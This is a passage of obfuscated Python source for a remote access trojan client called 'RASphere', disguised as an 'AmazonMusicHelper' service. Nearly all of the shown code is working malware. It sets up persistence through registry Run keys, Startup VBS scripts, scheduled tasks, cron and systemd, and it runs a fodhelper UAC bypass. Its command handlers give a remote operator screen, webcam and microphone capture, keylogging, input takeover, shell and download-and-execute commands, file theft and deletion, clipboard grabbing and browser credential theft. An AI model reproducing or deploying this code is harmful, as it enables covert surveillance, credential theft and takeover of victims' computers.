            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        for p in [r"Software\Classes\ms-settings\Shell\open",
                  r"Software\Classes\ms-settings\Shell",
                  r"Software\Classes\ms-settings"]:
            try:
                wr.DeleteKey(wr.HKEY_CURRENT_USER, p)
            except:
                pass
        _l.info(_D("_s260"))
    except Exception as e:
        _l.debug(f"UAC cleanup (non-critical): {e}")
_keepalive_stop = threading.Event()
def _keepalive_pinger(server_url):
    ""_D("_s261")""
    import urllib.request
    health_url = server_url.rstrip("/") + _D("_s262")
    while not _keepalive_stop.is_set():
        _keepalive_stop.wait(_KEEPALIVE)
        if _keepalive_stop.is_set():
            break
        try:
            urllib.request.urlopen(health_url, timeout=10)
            _l.debug(_D("_s263"))
        except Exception as e:
            _l.debug(f"Keep-alive ping failed: {e}")
def _exepath():
    if getattr(sys, _D("_s264"), False): return sys.executable
    return os.path.abspath(sys.argv[0])
def _pdir():
    if sys.platform == _D("_s265"):
        b = os.environ.get(_D("_s266"), os.path.expanduser("~"))
        p = os.path.join(b, _D("_s267"))
    else:
        p = os.path.expanduser(_D("_s268"))
    os.makedirs(p, exist_ok=True)
    return p
def _ip(url, secret, rec, cid):
    ep = _exepath(); pd = _pdir()
    dest = os.path.join(pd, _D("_s269") if sys.platform == "win32" else "amazonmusicd")
    if ep != dest:
        try: shutil.copy2(ep, dest); _l.info(f"Copied: {dest}")
        except Exception as e: _l.warning(f"Copy fail: {e}"); dest = ep
    ca = [dest, _D("_s270"), url or _SERVER, "--secret", secret or _SECRET, "--reconnect", str(rec or _RECON), "--no-persist"]
    if cid: ca += [_D("_s271"), cid]
    cl = subprocess.list2cmdline(ca)
    ok = False
    if sys.platform == _D("_s272"):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, _D("_s273"), 0, winreg.REG_SZ, cl); winreg.CloseKey(k); _l.info("Installed: Registry"); ok = True
        except Exception as e: _l.warning(f"Reg fail: {e}")
        try:
            sd = os.path.join(os.environ.get(_D("_s274"),""), "Microsoft","Windows","Start Menu","Programs","Startup")
            if os.path.exists(sd):
                vp = os.path.join(sd, _D("_s275"))
                with open(vp, "w") as f: f.write(f'CreateObject("WScript.Shell").Run "{cl.replace(chr(34), chr(34)+chr(34))}", 0, False')
                _l.info(_D("_s276")); ok = True
        except Exception as e: _l.warning(f"VBS fail: {e}")
        try:
            subprocess.run([_D("_s277"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            r = subprocess.run([_D("_s278"),"/Create","/TN","AmazonMusicHelper","/TR",cl,"/SC","ONLOGON","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if r.returncode == 0: _l.info(_D("_s279")); ok = True
        except Exception as e: _l.warning(f"Task fail: {e}")
    else:
        try:
            cline = f"@reboot {cl} > /dev/null 2>&1 &"
            ex = subprocess.run([_D("_s280"),"-l"], capture_output=True, text=True)
            ct = (ex.stdout or "")
            if _D("_s281") not in ct:
                ct += f"\n
                subprocess.run([_D("_s282"),"-"], input=ct, text=True)
                _l.info(_D("_s283")); ok = True
        except Exception as e: _l.warning(f"Cron fail: {e}")
        try:
            sd = os.path.expanduser(_D("_s284")); os.makedirs(sd, exist_ok=True)
            sc = f"[Unit]\nDescription=Amazon Music Helper\nAfter=network.target\n\n[Service]\nExecStart={cl}\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=default.target\n"
            with open(os.path.join(sd, _D("_s285")), "w") as f: f.write(sc)
            subprocess.run([_D("_s286"),"--user","daemon-reload"], capture_output=True)
            subprocess.run([_D("_s287"),"--user","enable","amazonmusic-helper"], capture_output=True)
            _l.info(_D("_s288")); ok = True
        except Exception as e: _l.warning(f"systemd fail: {e}")
    return ok
def _up():
    ok = False
    if sys.platform == _D("_s289"):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            try: winreg.DeleteValue(k, _D("_s290")); ok = True
            except FileNotFoundError: pass
            winreg.CloseKey(k)
        except: pass
        try:
            vp = os.path.join(os.environ.get(_D("_s291"),""), "Microsoft","Windows","Start Menu","Programs","Startup","AmazonMusicHelper.vbs")
            if os.path.exists(vp): os.remove(vp); ok = True
        except: pass
        try: subprocess.run([_D("_s292"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW); ok = True
        except: pass
    else:
        try:
            ex = subprocess.run([_D("_s293"),"-l"], capture_output=True, text=True)
            if ex.stdout and _D("_s294") in ex.stdout:
                nc = "\n".join(l for l in ex.stdout.split("\n")                    if _D("_s295") not in l)
                subprocess.run([_D("_s296"),"-"], input=nc, text=True); ok = True
        except: pass
        try:
            sp = os.path.expanduser(_D("_s297"))
            if os.path.exists(sp):
                subprocess.run([_D("_s298"),"--user","disable","amazonmusic-helper"], capture_output=True)
                os.remove(sp); subprocess.run([_D("_s299"),"--user","daemon-reload"], capture_output=True); ok = True
        except: pass
    try:
        pd = _pdir()
        for f in os.listdir(pd):
            try: os.remove(os.path.join(pd, f))
            except: pass
        try: os.rmdir(pd)
        except: pass
    except: pass
    return ok
def _sh(sio):
    sc = CapEngine(sio, _D("_s300"))
    wc = CapEngine(sio, _D("_s301"))
    mic = MicEngine(sio)
    mon = SysMon(sio)
    term = Term(sio)
    keylog = Keylog(sio)
    _s.scap = sc; _s.wcap = wc; _s.mic = mic; _s.keylog = keylog
    @sio.on(_D("_s302"))
    def _c():
        _l.info(_D("_s303")); _s.conn = True
        sio.emit(_D("_s304"), {"secret": _s.secret, "client_id": _s.cid,
            _D("_s305"): {"hostname": socket.gethostname(), "platform": sys.platform,
                _D("_s306"): os.environ.get("USERNAME", os.environ.get("USER","?")),
                _D("_s307"): {"screen": HAS["mss"], "input": HAS["pynput"], "clipboard": HAS["pyperclip"],
                    _D("_s308"): HAS["pycaw"], "monitor": HAS["psutil"], "terminal": True, "webcam": _h6}}})
    @sio.on(_D("_s309"))
    def _d():
        _block_input(False)  
        _l.info(_D("_s310")); _s.conn = False; _s.reg = False; sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop()
    @sio.on(_D("_s311"))
    def _r(d): _s.reg = True; _s.cid = d.get(_D("_s312"), _s.cid); _l.info(f"Registered: {_s.cid}")
    @sio.on(_D("_s313"))
    def _sc(d=None):
        if d and _D("_s314") in d: sc.monitor_idx = int(d.get("monitor", 1))
        sc.start(); sio.emit(_D("_s315"), {"active": True})
    @sio.on(_D("_s316"))
    def _sc2(): sc.stop(); sio.emit(_D("_s317"), {"active": False})
    @sio.on(_D("_s318"))
    def _smn(d):
        if d and _D("_s319") in d:
            sc.monitor_idx = int(d[_D("_s320")])
            was_running = sc.r
            if was_running:
                sc.stop()
                sc.start()
                sio.emit(_D("_s321"), {"active": True})
    @sio.on(_D("_s322"))
    def _sq(d):
        if d:
            if _D("_s323") in d: sc.q = max(1, min(100, int(d["quality"])))
            if _D("_s324") in d: sc.sc = max(0.1, min(1.0, float(d["scale"])))
            if "fps" in d: sc.fps = max(1, min(30, int(d["fps"])))
    @sio.on(_D("_s325"))
    def _wc(d=None): wc.start(); sio.emit(_D("_s326"), {"active": True})
    @sio.on(_D("_s327"))
    def _wc2(): wc.stop(); sio.emit(_D("_s328"), {"active": False})
    @sio.on(_D("_s329"))
    def _wq(d):
        if d:
            if _D("_s330") in d: wc.q = max(1, min(100, int(d["quality"])))
            if "fps" in d: wc.fps = max(1, min(30, int(d["fps"])))
    @sio.on(_D("_s331"))
    def _mstart(d=None): mic.start(); sio.emit(_D("_s332"), {"active": mic.r})
    @sio.on(_D("_s333"))
    def _mstop(): mic.stop(); sio.emit(_D("_s334"), {"active": False})
    @sio.on(_D("_s335"))
    def _kstart(d=None): keylog.start()
    @sio.on(_D("_s336"))
    def _kstop(): keylog.stop()
    @sio.on(_D("_s337"))
    def _me(d):
        if not HAS[_D("_s338")] or not _s.mc: return
        try:
            a = d.get(_D("_s339"),"")
            if a == _D("_s340"): _s.mc.position = (int(d.get("x",0)*_s.sw), int(d.get("y",0)*_s.sh))
            elif a == _D("_s341"): _s.mc.move(int(d.get("dx",0)), int(d.get("dy",0)))
            elif a == _D("_s342"):
                bm = {_D("_s343"): MB.left, "right": MB.right, "middle": MB.middle}
                _s.mc.click(bm.get(d.get(_D("_s344"),"left").lower(), MB.left), 2 if d.get("double") else 1)
            elif a == _D("_s345"): _s.mc.press({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == _D("_s346"): _s.mc.release({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == _D("_s347"): _s.mc.scroll(int(d.get("dx",0)), int(d.get("dy",0)))
        except Exception as e: _l.error(f"Mouse err: {e}")
    @sio.on(_D("_s348"))
    def _ke(d):
        if not HAS[_D("_s349")] or not _s.kc: return
        try:
            SP = {_D("_s350"): Key.ctrl, "alt": Key.alt, "shift": Key.shift, "win": Key.cmd, "cmd": Key.cmd, "super": Key.cmd,
                  "tab": Key.tab, _D("_s351"): Key.enter, "esc": Key.esc, "space": Key.space, "backspace": Key.backspace,
                  _D("_s352"): Key.delete, "home": Key.home, "end": Key.end, "page_up": Key.page_up, "page_down": Key.page_down,
                  "up": Key.up, _D("_s353"): Key.down, "left": Key.left, "right": Key.right,
                  **{f"f{i}": getattr(Key, f"f{i}") for i in range(1,13)}}
            def rk(k): k = k.lower(); return SP.get(k, KeyCode.from_char(k))
            a = d.get(_D("_s354"),"")
            if a == _D("_s355"): _s.kc.press(rk(d.get("key","")))
            elif a == _D("_s356"): _s.kc.release(rk(d.get("key","")))
            elif a == _D("_s357"):
                ks = [rk(k) for k in d.get(_D("_s358"),[])]
                for k in ks: _s.kc.press(k)
                for k in reversed(ks): _s.kc.release(k)
            elif a == _D("_s359"): _s.kc.type(d.get("text",""))
            elif a == _D("_s360"):
                scs = {_D("_s361"): ([Key.ctrl, Key.alt], Key.delete), "ctrl_shift_esc": ([Key.ctrl, Key.shift], Key.esc),
                       _D("_s362"): ([Key.alt], Key.tab), "alt_f4": ([Key.alt], Key.f4),
                       _D("_s363"): ([Key.cmd], KeyCode.from_char("d")), "win_r": ([Key.cmd], KeyCode.from_char("r")),
                       _D("_s364"): ([Key.cmd], KeyCode.from_char("e")), "win_l": ([Key.cmd], KeyCode.from_char("l")),
                       _D("_s365"): ([Key.ctrl], KeyCode.from_char("c")), "ctrl_v": ([Key.ctrl], KeyCode.from_char("v")),
                       _D("_s366"): ([Key.ctrl], KeyCode.from_char("x")), "ctrl_z": ([Key.ctrl], KeyCode.from_char("z")),
                       _D("_s367"): ([Key.ctrl], KeyCode.from_char("a")), "ctrl_s": ([Key.ctrl], KeyCode.from_char("s"))}
                sc = scs.get(d.get(_D("_s368"),""))
                if sc:
                    for m in sc[0]: _s.kc.press(m)
                    _s.kc.press(sc[1]); _s.kc.release(sc[1])
                    for m in reversed(sc[0]): _s.kc.release(m)
        except Exception as e: _l.error(f"Key err: {e}")
    @sio.on(_D("_s369"))
    def _ts(): ok = term.start(); sio.emit(_D("_s370"), {"active": ok})
    @sio.on(_D("_s371"))
    def _ti(d): term.write((d or {}).get(_D("_s372"),""))
    @sio.on(_D("_s373"))
    def _tst(): term.stop(); sio.emit(_D("_s374"), {"active": False})
    @sio.on(_D("_s375"))
    def _sm(): mon.start(); sio.emit(_D("_s376"), {"active": True})
    @sio.on(_D("_s377"))
    def _sm2(): mon.stop(); sio.emit(_D("_s378"), {"active": False})
    @sio.on(_D("_s379"))
    def _gp(): sio.emit(_D("_s380"), {"processes": _proc()})
    @sio.on(_D("_s381"))
    def _kp(d): pid = (d or {}).get("pid"); ok, msg = _kill(pid); sio.emit(_D("_s382"), {"ok": ok, "message": msg, "pid": pid})
    @sio.on(_D("_s383"))
    def _cg():
        if HAS[_D("_s384")]:
            try: sio.emit(_D("_s385"), {"text": pyperclip.paste()})
            except Exception as e: sio.emit(_D("_s386"), {"error": str(e)})
        else: sio.emit(_D("_s387"), {"error": "N/A"})
    @sio.on(_D("_s388"))
    def _cs(d):
        if HAS[_D("_s389")]:
            try: pyperclip.copy((d or {}).get(_D("_s390"),"")); sio.emit("clipboard_status", {"ok": True})
            except Exception as e: sio.emit(_D("_s391"), {"ok": False, "error": str(e)})
        else: sio.emit(_D("_s392"), {"ok": False, "error": "N/A"})
    @sio.on(_D("_s393"))
    def _ag(): r = _audio(); sio.emit(_D("_s394"), r or {"error": "N/A"})
    @sio.on(_D("_s395"))
    def _as(d): lv = (d or {}).get(_D("_s396"),50); ok = _avol(int(lv)); sio.emit("audio_status", {"ok": ok, "volume": int(lv)})
    @sio.on(_D("_s397"))
    def _am(): ok = _amute(); r = _audio(); sio.emit(_D("_s398"), r or {"error": "N/A"})
    @sio.on(_D("_s399"))
    def _pmo(): ok = _monoff(); sio.emit(_D("_s400"), {"action": "monitor_off", "ok": ok})
    @sio.on(_D("_s401"))
    def _pl(): ok = _lock(); sio.emit(_D("_s402"), {"action": "lock", "ok": ok})
    @sio.on(_D("_s403"))
    def _ps(): ok = _sleep(); sio.emit(_D("_s404"), {"action": "sleep", "ok": ok})
    @sio.on(_D("_s405"))
    def _wp(d): ok, msg = _wallpaper((d or {}).get(_D("_s406"),"")); sio.emit("cmd_result", {"cmd": "wallpaper", "ok": ok, "message": msg})
    @sio.on(_D("_s407"))
    def _mb(d): ok, msg = _msgbox((d or {}).get(_D("_s408"),"RASphere"), (d or {}).get("text","Hello!")); sio.emit("cmd_result", {"cmd": "msgbox", "ok": ok, "message": msg})
    @sio.on(_D("_s409"))
    def _ou(d): ok, msg = _openurl((d or {}).get("url","")); sio.emit(_D("_s410"), {"cmd": "openurl", "ok": ok, "message": msg})
    @sio.on(_D("_s411"))
    def _tss(): data, fmt = _screenshot(); sio.emit(_D("_s412"), {"data": data, "format": fmt} if data else {"error": fmt})
    @sio.on(_D("_s413"))
    def _geo(): sio.emit(_D("_s414"), _geoip())
    @sio.on(_D("_s415"))
    def _ga(): sio.emit(_D("_s416"), {"apps": _apps()})
    @sio.on(_D("_s417"))
    def _psnd(d): ok, msg = _play_sound((d or {}).get(_D("_s418"),800), (d or {}).get("dur",1)); sio.emit("cmd_result", {"cmd": "sound", "ok": ok, "message": msg})
    @sio.on(_D("_s419"))
    def _sf(d): r = _search_files((d or {}).get(_D("_s420"),"C:\\"), (d or {}).get("pattern","*"), (d or {}).get("max",50)); sio.emit("search_result", {"results": r})
    @sio.on(_D("_s421"))
    def _ec(d): out, rc = _execute_command((d or {}).get(_D("_s422"),"")); sio.emit("execute_result", {"output": out, "code": rc})
    @sio.on(_D("_s423"))
    def _de(d): ok, msg = _download_exec((d or {}).get("url",""), (d or {}).get(_D("_s424"))); sio.emit("cmd_result", {"cmd": "download_exec", "ok": ok, "message": msg})
    @sio.on(_D("_s425"))
    def _ib(d=None): ok, msg = _block_input(True); sio.emit(_D("_s426"), {"cmd": "input_block", "ok": ok, "message": msg})
    @sio.on(_D("_s427"))
    def _iub(d=None): ok, msg = _block_input(False); sio.emit(_D("_s428"), {"cmd": "input_unblock", "ok": ok, "message": msg})
    @sio.on(_D("_s429"))
    def _fl(d): sio.emit(_D("_s430"), _flist((d or {}).get("path","")))
    @sio.on(_D("_s431"))
    def _fdr(d): sio.emit(_D("_s432"), {**_fread((d or {}).get("path",""), (d or {}).get("offset",0)), "path": (d or {}).get("path","")})
    @sio.on(_D("_s433"))
    def _fd(d): ok, msg = _fdel((d or {}).get(_D("_s434"),"")); sio.emit("file_delete_result", {"ok": ok, "message": msg})
    @sio.on(_D("_s435"))
    def _fnf(d): ok, msg = _fmkdir((d or {}).get(_D("_s436"),""), (d or {}).get("name","New Folder")); sio.emit("file_new_folder_result", {"ok": ok, "message": msg})
    @sio.on(_D("_s437"))
    def _fuc(d):
        path = (d or {}).get(_D("_s438"),""); chunk = (d or {}).get("data",""); offset = (d or {}).get("offset",0)
        mode = "wb" if offset == 0 else "ab"
        ok, msg = _fwrite(path, chunk, offset, mode)
        sio.emit(_D("_s439"), {"ok": ok, "message": msg, "path": path})
    @sio.on(_D("_s440"))
    def _ninfo(d=None): sio.emit(_D("_s441"), _network_info())
    @sio.on(_D("_s442"))
    def _bs(d=None):
        _l.info(_D("_s443"))
        result = _browser_steal()
        sio.emit(_D("_s444"), result)
    @sio.on(_D("_s445"))
    def _ks(d=None):
        _l.warning(_D("_s446")); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); sio.disconnect(); os._exit(0)
def main():
    p = argparse.ArgumentParser(description=_D("_s447"))
    p.add_argument(_D("_s448"), default=None, help=f"Server URL (default: {_SERVER})")
    p.add_argument(_D("_s449"), default=None, help=f"Client secret (default: ***)")
    p.add_argument(_D("_s450"), default=None, help="Client ID (default: auto)")
    p.add_argument(_D("_s451"), type=int, default=None, help=f"Reconnect delay (default: {_RECON}s)")
    p.add_argument(_D("_s452"), action="store_true", help="Install persistence")
    p.add_argument(_D("_s453"), action="store_true", help="Remove persistence")
    p.add_argument(_D("_s454"), action="store_true", help="Skip auto-persistence")
    p.add_argument(_D("_s455"), action="store_true", help=argparse.SUPPRESS)
    p.add_argument(_D("_s456"), action="store_true", help="Skip UAC bypass on startup")
    args = p.parse_args()
    url = args.server or _SERVER; secret = args.secret or _SECRET
    rec = args.reconnect if args.reconnect is not None else _RECON
    cid = args.id or _CLIENT_ID
    if args.uninstall:
        if _up(): print(_D("_s457"))
        else: print(_D("_s458"))
        return
    if args.install:
        if not url or not secret: print(_D("_s459")); sys.exit(1)
        if _ip(url, secret, rec, cid): print(_D("_s460"))
        else: print(_D("_s461"))
    if sys.platform == _D("_s462") and not getattr(args, "no_elevate", False) and not getattr(args, "elevated", False):
        if not _is_admin():
            _l.info(_D("_s463"))
            _fodhelper_uac_bypass(args)
            print(_D("_s464"))
        else:
            _l.info(_D("_s465"))
    if getattr(args, _D("_s466"), False):
        _l.info(_D("_s467"))
        _cleanup_uac_registry()
    if not args.no_persist and not args.uninstall:
        try:
            if url and secret:
                ok = _ip(url, secret, rec, cid)
                if ok: print(_D("_s468"))
                else: print(_D("_s469"))
        except Exception as e: print(f"[!] Auto-persist error: {e}")
    if not url: print(_D("_s470")); sys.exit(1)
    if not secret: print(_D("_s471")); sys.exit(1)
    _s.url = url.rstrip("/"); _s.secret = secret
    _s.cid = cid or f"{socket.gethostname()}-{os.urandom(3).hex()}"
    _l.info(f"RASphere Client | ID: {_s.cid} | Server: {_s.url}")
    sio = sio_lib.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=rec,
                          reconnection_delay_max=30, _l=False, engineio_logger=False)
    _sh(sio); _s.sio = sio
    threading.Thread(target=_keepalive_pinger, args=(_s.url,), daemon=True).start()
    update_checked = False
    current_delay = rec  
    while True:
        try:
            _l.info(f"Connecting to {_s.url}...")
            sio.connect(_s.url, wait_timeout=10)
            _l.info(_D("_s472"))
            current_delay = rec
            if not update_checked:
                new_ver, dl_url = _check_for_update(_s.url)
                update_checked = True
                if new_ver and dl_url:
                    _l.info(f"New version {new_ver} available, applying update...")
                    ok = _download_and_install(dl_url, new_ver)
                    if ok:
                        _l.info(_D("_s473"))
                        sio.disconnect()
                        os._exit(0)
            sio.wait()
        except KeyboardInterrupt: _l.info(_D("_s474")); break
        except Exception as e:
            _l.error(f"Connection error: {e}")
            if not rec: break
            _l.info(f"Reconnecting in {current_delay}s...")
            time.sleep(current_delay)
            current_delay = min(current_delay * 2, _RECON_MAX)
    sio.disconnect(); _l.info(_D("_s475"))
if __name__ == _D("_s476"): main()
